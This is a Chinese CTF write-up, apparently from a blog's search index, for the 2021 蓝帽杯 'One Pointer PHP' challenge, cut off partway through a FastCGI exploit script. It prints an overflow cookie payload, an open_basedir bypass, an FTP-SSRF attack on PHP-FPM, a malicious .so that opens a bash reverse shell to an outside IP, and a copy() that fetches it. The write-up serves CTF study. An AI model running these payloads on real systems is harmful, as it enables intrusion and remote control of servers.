<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>蓝帽杯2021 One Pointer PHP</title>
    <link href="/2021/06/15/%E8%93%9D%E5%B8%BD%E6%9D%AF2021-One-Pointer-PHP/"/>
    <url>/2021/06/15/%E8%93%9D%E5%B8%BD%E6%9D%AF2021-One-Pointer-PHP/</url>
    
    <content type="html"><![CDATA[<h2 id="蓝帽杯-2021-One-Pointer-PHP"><a href="#蓝帽杯-2021-One-Pointer-PHP" class="headerlink" title="[蓝帽杯 2021]One Pointer PHP"></a>[蓝帽杯 2021]One Pointer PHP</h2><h3 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h3><h4 id="PHP-数组溢出"><a href="#PHP-数组溢出" class="headerlink" title="PHP 数组溢出"></a>PHP 数组溢出</h4><p>如果给定的一个整数超出了整型（integer）的范围，将会被解释为浮点型（float）。同样如果执行的运算结果超出了整型（integer）范围，也会返回浮点型（float）。</p><h4 id="绕过open-basedir"><a href="#绕过open-basedir" class="headerlink" title="绕过open_basedir"></a>绕过<code>open_basedir</code></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">mkdir(<span class="hljs-string">&#x27;w0s1np&#x27;</span>);chdir(<span class="hljs-string">&#x27;w0s1np&#x27;</span>);ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;..&#x27;</span>);chdir(<span class="hljs-string">&#x27;..&#x27;</span>);chdir(<span class="hljs-string">&#x27;..&#x27;</span>);chdir(<span class="hljs-string">&#x27;..&#x27;</span>);ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>);print_r(scandir(<span class="hljs-string">&#x27;/&#x27;</span>));<br></code></pre></td></tr></table></figure><h4 id="加载恶意-so-扩展"><a href="#加载恶意-so-扩展" class="headerlink" title="加载恶意 .so 扩展"></a>加载恶意 .so 扩展</h4><h4 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h4><h3 id="解题："><a href="#解题：" class="headerlink" title="解题："></a>解题：</h3><p>源码如下：</p><ul><li>user.php</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$count</span>;<br>&#125; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><ul><li>add_api.php</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;user.php&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>=unserialize(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;data&quot;</span>]))&#123;<br><span class="hljs-variable">$count</span>[++<span class="hljs-variable">$user</span>-&gt;count]=<span class="hljs-number">1</span>; <span class="hljs-comment">//将数组的第几个属性赋值为1</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$count</span>[]=<span class="hljs-number">1</span>)&#123;<br><span class="hljs-variable">$user</span>-&gt;count+=<span class="hljs-number">1</span>;<br>setcookie(<span class="hljs-string">&quot;data&quot;</span>,serialize(<span class="hljs-variable">$user</span>));<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;backdoor&quot;</span>]);<br>&#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$user</span>=<span class="hljs-keyword">new</span> User;<br><span class="hljs-variable">$user</span>-&gt;count=<span class="hljs-number">1</span>;<br>setcookie(<span class="hljs-string">&quot;data&quot;</span>,serialize(<span class="hljs-variable">$user</span>));<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>我们需要进入后门，但是发现if语句那里是一个赋值语句，永真，所以按理说不管怎样返回的都是 True：</p><p>但是：</p><p><img src="https://woshilnp.github.io/wzimg/304.png" alt="a"></p><p>当我们进行<code>$count[]=1</code>赋值运算时，是往<code>$count[++$user-&gt;count]=1</code>这个赋值语句的键值后面一个赋值</p><p>当我们<code>$count[++$user-&gt;count]=1</code>这里的键值刚好没有溢出时，后面赋值语句就会溢出</p><p>导致报错，返回值为0，然后就可以成功绕过并进入到 eval() 中了。</p><p>所以payload：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;User&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;count&quot;</span>;i:<span class="hljs-number">9223372036854775806</span>;&#125;<br></code></pre></td></tr></table></figure><p>然后修改<code>Cookie</code>后便可以进行代码执行了：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://ad<span class="hljs-number">6</span>b<span class="hljs-number">7418</span>-<span class="hljs-number">6248</span>-<span class="hljs-number">4047</span>-<span class="hljs-number">909</span>c-f<span class="hljs-number">67077</span>e<span class="hljs-number">14</span>d<span class="hljs-number">91</span>.node<span class="hljs-number">3</span>.buuoj.cn/add_api.php?backdoor=phpinfo();<br></code></pre></td></tr></table></figure><p>查看 phpinfo，发现题目做了以下限制：</p><p>disable_functions：</p><p><img src="https://woshilnp.github.io/wzimg/305.png" alt="a"></p><p>过滤了各种命令执行函数，但是像<code>scandir</code>、<code>file_get_contents</code>、<code>file_put_contents</code>等目录和文件操作函数没有被过滤</p><p><img src="https://woshilnp.github.io/wzimg/306.png" alt="a"></p><p>设置了 open_basedir，只能访问 Web 目录，但我们可以利用<code>chdir()</code>与<code>ini_set()</code>组合来绕过<code>open_basedir</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">/add_api.php?backdoor=mkdir(<span class="hljs-string">&#x27;w0s1np&#x27;</span>);chdir(<span class="hljs-string">&#x27;w0s1np&#x27;</span>);ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;..&#x27;</span>);chdir(<span class="hljs-string">&#x27;..&#x27;</span>);chdir(<span class="hljs-string">&#x27;..&#x27;</span>);chdir(<span class="hljs-string">&#x27;..&#x27;</span>);ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>);print_r(scandir(<span class="hljs-string">&#x27;/&#x27;</span>));<br><br>mkdir(<span class="hljs-string">&#x27;w0s1np&#x27;</span>);chdir(<span class="hljs-string">&#x27;w0s1np&#x27;</span>);ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;..&#x27;</span>);chdir(<span class="hljs-string">&#x27;..&#x27;</span>);chdir(<span class="hljs-string">&#x27;..&#x27;</span>);chdir(<span class="hljs-string">&#x27;..&#x27;</span>);ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>);<span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-string">&#x27;/flag&#x27;</span>);<br></code></pre></td></tr></table></figure><p>发现可以读出<code>/etc/passwd</code>，但是读不出<code>/flag</code>，猜测与权限有关，那我们就要想办法提权了，但是要提权则必须先拿到 Shell 执行命令，也就是得要先绕过<code>disable_functions</code>。</p><p>当读取<code>/proc/self/cmdline</code>时发现当前进程是<code>php-fpm</code>：</p><p><img src="https://woshilnp.github.io/wzimg/315.png" alt="a"></p><p>所以说这道题应该就是通过攻击<code>php-fpm</code>来绕过<code>disable_functions</code>了。</p><p>首先查看<code>nginx</code>配置文件<code>/etc/nginx/nginx.conf</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">##</span><br><span class="hljs-comment"># Virtual Host Configs</span><br><span class="hljs-comment">##</span><br><br><span class="hljs-keyword">include</span> /etc/nginx/conf.d<span class="hljs-comment">/*.conf;</span><br><span class="hljs-comment">include /etc/nginx/sites-enabled/*;</span><br><span class="hljs-comment">&#125;</span><br></code></pre></td></tr></table></figure><p>在读取<code>/etc/nginx/sites-enabled/default</code></p><p><img src="https://woshilnp.github.io/wzimg/316.png" alt="a"></p><p>发现在本地9001端口开有FastCGI服务，<code>phpinfo</code>中也表明该项目为FPM/FastCGI，可以通过未授权打FPM rce</p><p>FPM其实是一个<code>fastcgi</code>协议解析器，Nginx等服务器中间件将用户请求按照<code>fastcgi</code>的规则打包好通过TCP传给FPM</p><p>FPM按照<code>fastcgi</code>的协议将TCP流解析成真正的数据。</p><p>例如，用户访问<code>http://127.0.0.1/index.php?a=1&amp;b=2</code>，如果<code>web</code>目录是<code>/var/www/html</code>，那么Nginx会将这个请求变成如下<code>key-value</code>对：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php">&#123;<br>    <span class="hljs-string">&#x27;GATEWAY_INTERFACE&#x27;</span>: <span class="hljs-string">&#x27;FastCGI/1.0&#x27;</span>,<br>    <span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>: <span class="hljs-string">&#x27;GET&#x27;</span>,<br>    <span class="hljs-string">&#x27;SCRIPT_FILENAME&#x27;</span>: <span class="hljs-string">&#x27;/var/www/html/index.php&#x27;</span>,<br>    <span class="hljs-string">&#x27;SCRIPT_NAME&#x27;</span>: <span class="hljs-string">&#x27;/index.php&#x27;</span>,<br>    <span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>: <span class="hljs-string">&#x27;?a=1&amp;b=2&#x27;</span>,<br>    <span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>: <span class="hljs-string">&#x27;/index.php?a=1&amp;b=2&#x27;</span>,<br>    <span class="hljs-string">&#x27;DOCUMENT_ROOT&#x27;</span>: <span class="hljs-string">&#x27;/var/www/html&#x27;</span>,<br>    <span class="hljs-string">&#x27;SERVER_SOFTWARE&#x27;</span>: <span class="hljs-string">&#x27;php/fcgiclient&#x27;</span>,<br>    <span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>: <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<br>    <span class="hljs-string">&#x27;REMOTE_PORT&#x27;</span>: <span class="hljs-string">&#x27;12345&#x27;</span>,<br>    <span class="hljs-string">&#x27;SERVER_ADDR&#x27;</span>: <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<br>    <span class="hljs-string">&#x27;SERVER_PORT&#x27;</span>: <span class="hljs-string">&#x27;80&#x27;</span>,<br>    <span class="hljs-string">&#x27;SERVER_NAME&#x27;</span>: <span class="hljs-string">&quot;localhost&quot;</span>,<br>    <span class="hljs-string">&#x27;SERVER_PROTOCOL&#x27;</span>: <span class="hljs-string">&#x27;HTTP/1.1&#x27;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>通过在FastCGI协议修改PHP_VALUE字段进而修改<code>php.ini</code>中的一些设置，而<code>open_basedir</code>同样可以通过此种方法进行设置。比如：<code>$php_value = &quot;open_basedir = /&quot;;</code></p><p>因为FPM没有判断请求的来源是否必须来自Webserver。根据PHP解析器的流程，我们可以伪造FastCGI向FPM发起请求，PHP_VALUE相当于改变<code>.ini</code>中的设置，覆盖了本身的<code>open_basedir</code></p><p>既然我们可以通过<code>eval()</code>执行任意代码，那我们便可以构造恶意代码进行 SSRF，利用 SSRF 攻击本地的 PHP-FPM。但是由于这里禁用了许多函数和类，像那些普通能构成 SSRF 的函数和类都无法使用，但是 FTP 协议未被禁用。</p><p>我们可以通过在 VPS上搭建恶意的FTP服务器，骗取目标主机将 Payload 重定向到自己的 9001 端口上，从而实现攻击 PHP-FPM 并执行命令。</p><p>php 支持的协议和封装：<a href="https://www.php.net/manual/zh/wrappers.php%EF%BC%8C%E5%8F%AF%E4%BB%A3%E6%9B%BF%E5%8F%91%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8C%85%E7%9A%84%E5%8D%8F%E8%AE%AE%E5%8F%AA%E6%9C%89%60ftp://%60">https://www.php.net/manual/zh/wrappers.php，可代替发二进制包的协议只有`ftp://`</a></p><blockquote><p><strong>ftp 的两种传输模式</strong></p><p>ftp 有两种使用模式：主动模式（port）和被动模式（pasv）。</p><p>port 要求客户端和服务器端同时打开并且监听一个端口以创建连接。在这种情况下，客户端由于安装了防火墙会产生一些问题，连接有时候会被客户端的防火墙阻止。所以，创立了 pasv 。pasv 只要求服务器端产生一个监听相应端口的进程，这样就可以绕过客户端安装了防火墙的问题。</p><p>ftp 客户端和服务器之间需要建立两条 tcp 连接，一条是控制连接（ 21 端口），用来发送控制指令，另外一条是数据连接（ 20 端口 / 随机端口），真正的文件传输是通过数据连接来完成的。</p><p><strong>两种传输模式的异同</strong></p><p>对于两种传输模式来说，控制连接的建立过程都是一样，均为服务器监听 21 号端口，客户端向服务器的该端口发起 tcp 连接。</p><p>两种传输模式的不同之处体现在数据连接的建立，对于数据连接的建立，主被动模式的不同在于数据连接的建立“服务器”是“主动”还是”被动”：</p><p>port 服务器通过控制连接知道客户端监听的端口后，使用自己的 20 号端口作为源端口，服务器“主动”发起 tcp 数据连接。</p><p>pasv 服务器监听 1024-65535 的一个随机端口，并通过控制连接将该端口告诉客户端，客户端向服务器的该端口发起 tcp 数据连接，这种情况下数据连接的建立相当于服务器是“被动”的。</p></blockquote><p>这里利用了 FTP 协议工作方式中的被动方式，在该方式中，FTP 客户端和服务端在建立控制通道的时候用二者的TCP 21端口建立连接，建立连接后发送 PASV 命令。FTP 服务器收到 PASV 命令后，随机打开一个高端端口（端口号大于1024）并且通知客户端在这个端口上传送数据的请求，客户端连接到 FTP 服务器的此高端端口，通过三次握手建立通道，然后FTP服务器将通过这个端口进行数据的传送。</p><p>可见，在被动方式中，FTP 客户端和服务端的数据传输端口是由服务端指定的，而且还有一点是很多地方没有提到的，实际上除了端口，服务器的地址也是可以被指定的。由于 FTP 和 HTTP 类似，协议内容全是纯文本，所以我们可以很清晰的看到它是如何指定地址和端口的：</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">227 </span>Entering Passive Mode(<span class="hljs-number">192</span>,<span class="hljs-number">168</span>,<span class="hljs-number">9</span>,<span class="hljs-number">2</span>,<span class="hljs-number">4</span>,<span class="hljs-number">8</span>)<br></code></pre></td></tr></table></figure><p>227 和 Entering Passive Mode 类似 HTTP 的状态码和状态短语，而 (192,168,9,2,4,8) 代表让客户端到连接 192.168.9.2 的 4 * 256 + 8 = 1032 端口。</p><p>file_put_contents() 函数在使用 FTP 协议时，会将第二个参数 data 中的内容上传到 FTP 服务器。由于上面说的被动模式下，服务器的地址和端口是可控的，所以我们就可以将地址和端口指到 127.0.0.1:9000。同时由于 FTP 的特性，其会把 data 原封不动的发给 127.0.0.1:9000，不会有任何的多余内容（类似 Gopher 协议），完美符合攻击 Fastcgi/PHP-FPM 的要求。</p><p>所以，我们便可以通过 file_put_contents() 函数构造FTP-SSRF，来实现对目标主机上 PHP-FPM 的攻击。</p><p>首先尝试使用 Gopherus 生成的攻击 PHP-FPM 的 Payload 失败，然后尝试通过加载恶意 .so 扩展的方式。</p><p>先编写一个扩展（网上的脚本，亘古不变）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#define _GNU_SOURCE</span><br><span class="hljs-comment">#include &lt;stdlib.h&gt;</span><br><span class="hljs-comment">#include &lt;stdio.h&gt;</span><br><span class="hljs-comment">#include &lt;string.h&gt;</span><br><br>__attribute__ ((__constructor__)) <span class="hljs-keyword">void</span> preload (<span class="hljs-keyword">void</span>)&#123;<br>    system(<span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/47.110.124.239/2333 0&gt;&amp;1&#x27;&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>编译：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">gcc hpdoger.c -fPIC -shared -o hpdoger.so<br></code></pre></td></tr></table></figure><p>将生成的 hpdoger.so 上传到目标主机的 /tmp 目录中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">PHP<br>/add_api.php?backdoor=mkdir(<span class="hljs-string">&#x27;w0s1np&#x27;</span>);chdir(<span class="hljs-string">&#x27;w0s1np&#x27;</span>);ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;..&#x27;</span>);chdir(<span class="hljs-string">&#x27;..&#x27;</span>);chdir(<span class="hljs-string">&#x27;..&#x27;</span>);chdir(<span class="hljs-string">&#x27;..&#x27;</span>);ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>);copy(<span class="hljs-string">&#x27;http://47.110.124.239/test/hpdoger.so&#x27;</span>,<span class="hljs-string">&#x27;/tmp/hpdoger.so&#x27;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://woshilnp.github.io/wzimg/340.png" alt="a"></p><p>然后简单修改以下脚本（根据 <a href="https://github.com/wofeiwo/webcgi-exploits/blob/master/php/Fastcgi/fcgi_jailbreak.php">fcgi_jailbreak.php</a> 改的）并执行，生成 payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Note : Code is released under the GNU LGPL</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Please do not change the header of this file</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * This library is free software; you can redistribute it and/or modify it under the terms of the GNU</span><br><span class="hljs-comment"> * Lesser General Public License as published by the Free Software Foundation; either version 2 of</span><br><span class="hljs-comment"> * the License, or (at your option) any later version.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;</span><br><span class="hljs-comment"> * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * See the GNU Lesser General Public License for more details.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Handles communication with a FastCGI application</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span>      Pierrick Charron &lt;pierrick<span class="hljs-doctag">@webstart</span>.fr&gt;</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@version</span>     1.0</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FCGIClient</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">const</span> VERSION_1            = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">const</span> BEGIN_REQUEST        = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">const</span> ABORT_REQUEST        = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">const</span> END_REQUEST          = <span class="hljs-number">3</span>;<br>    <span class="hljs-keyword">const</span> PARAMS               = <span class="hljs-number">4</span>;<br>    <span class="hljs-keyword">const</span> STDIN                = <span class="hljs-number">5</span>;<br>    <span class="hljs-keyword">const</span> STDOUT               = <span class="hljs-number">6</span>;<br>    <span class="hljs-keyword">const</span> STDERR               = <span class="hljs-number">7</span>;<br>    <span class="hljs-keyword">const</span> DATA                 = <span class="hljs-number">8</span>;<br>    <span class="hljs-keyword">const</span> GET_VALUES           = <span class="hljs-number">9</span>;<br>    <span class="hljs-keyword">const</span> GET_VALUES_RESULT    = <span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">const</span> UNKNOWN_TYPE         = <span class="hljs-number">11</span>;<br>    <span class="hljs-keyword">const</span> MAXTYPE              = <span class="hljs-built_in">self</span>::UNKNOWN_TYPE;<br>    <span class="hljs-keyword">const</span> RESPONDER            = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">const</span> AUTHORIZER           = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">const</span> FILTER               = <span class="hljs-number">3</span>;<br>    <span class="hljs-keyword">const</span> REQUEST_COMPLETE     = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">const</span> CANT_MPX_CONN        = 